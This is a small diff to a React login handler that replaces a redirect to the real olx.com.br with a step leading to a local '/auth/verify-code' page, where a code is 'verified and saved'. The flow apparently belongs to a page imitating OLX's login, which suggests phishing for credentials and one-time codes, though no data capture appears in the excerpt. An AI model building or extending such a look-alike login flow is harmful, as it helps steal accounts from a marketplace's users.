@@ -40,11 +40,11 @@ const handleLogin = async (e: React.FormEvent) => {
 
   setShowSuccess(true);
 
-  setTimeout(() => {
-    toast.success("Login realizado com sucesso!");
-   window.location.href = "https://olx.com.br"
-  }, 1500);
-};
+ toast.success("Código verificado e salvo!");
+                setTimeout(() => {
+                    navigate("/auth/verify-code");
+                }, 500);
+              }
 
   return (
     <div className="min-h-screen bg-background flex flex-col">
